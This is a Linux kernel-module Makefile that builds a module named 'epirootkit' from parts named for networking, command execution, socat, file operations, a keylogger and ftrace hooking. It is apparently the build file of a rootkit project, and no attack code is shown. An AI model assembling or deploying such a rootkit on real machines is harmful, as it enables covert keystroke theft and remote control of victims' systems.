KERNELDIR = /lib/modules/$(shell uname -r)/build
PWD = $(shell pwd)
obj-m = epirootkit.o
epirootkit-objs = main.o network.o exec_cmd.o socat.o file_ops.o keylogger.o ftrace_helper.o

modules: $(mult-objs)
	$(MAKE) -C $(KERNELDIR) M=$(PWD) $@ $^
clean:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) $@